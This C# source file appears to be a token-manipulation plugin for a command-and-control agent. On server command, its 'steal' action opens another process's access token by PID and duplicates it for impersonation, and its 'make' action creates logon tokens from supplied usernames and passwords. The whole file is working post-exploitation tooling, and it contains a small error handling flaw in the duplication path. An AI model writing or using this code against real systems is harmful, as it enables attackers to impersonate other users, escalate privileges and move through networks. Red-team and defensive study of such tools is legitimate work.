﻿using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Diagnostics;
using System.Security.Principal;

namespace token
{
    public class Token : IPlugin
    {
        public string Name => "token";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }
        public Token(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);

            switch(args["action"])
            {
                case "steal":
                    StealToken(job, args);
                    break;
                case "make":
                    MakeToken(job);
                    break;
                case "list":
                    await messageManager.AddResponse(tokenManager.List(job));
                    break;
                default:
                    break;
            }
        }
        private void MakeToken(ServerJob job)
        {
            CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                if (Native.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Native.LogonType.LOGON32_LOGON_NETWORK : Native.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Native.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    //Make Token Success

                    messageManager.AddResponse(this.tokenManager.AddToken(hToken, tokenOptions, job.task.id));
                }
                else
                {
                    messageManager.AddResponse(new ResponseResult()
                    {
                        user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                }

            }
            catch (Exception e)
            {
                messageManager.AddResponse(new ResponseResult()
                {
                    user_output = $"Failed: {e}",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson());
            }
        }

        private void StealToken(ServerJob job, Dictionary<string, string> args)
        {
            int pid;
            if (!args.ContainsKey("pid"))
            {
                messageManager.AddResponse(new ResponseResult()
                {
                    user_output = $"Failed: no pid specified.",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson());
                return;
            }

            if (int.TryParse(args["pid"], out pid))
            {
                try
                {
                    Process proc = Process.GetProcessById(pid);
                    SafeAccessTokenHandle hToken;
                    SafeAccessTokenHandle dupHandle;
                    
                    SafeAccessTokenHandle procHandle = new SafeAccessTokenHandle(proc.Handle);
                    if(!Native.OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out hToken))
                    {
                        messageManager.AddResponse(new ResponseResult()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }

                    if(!Native.DuplicateTokenEx(hToken.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero,(uint)TokenImpersonationLevel.Impersonation, Native.TOKEN_TYPE.TokenImpersonation, out dupHandle))
                    {
                        messageManager.AddResponse(new ResponseResult()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                    }

                    CreateToken tokenOptions = new CreateToken();
                    tokenOptions.name = $"Process {proc.Id} (Duplicated)";
                    tokenOptions.username = proc.Id.ToString();
                    tokenOptions.domain = "stolen";
                    var response = this.tokenManager.AddToken(hToken, tokenOptions, job.task.id);

                    response.tokens.First().process_id = proc.Id;

                    messageManager.AddResponse(response);

                }
                catch (Exception e)
                {
                    messageManager.AddResponse(new ResponseResult()
                    {
                        user_output = $"Failed: {e}",
                        status = "errored",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                }
            
            }
        }
    }
}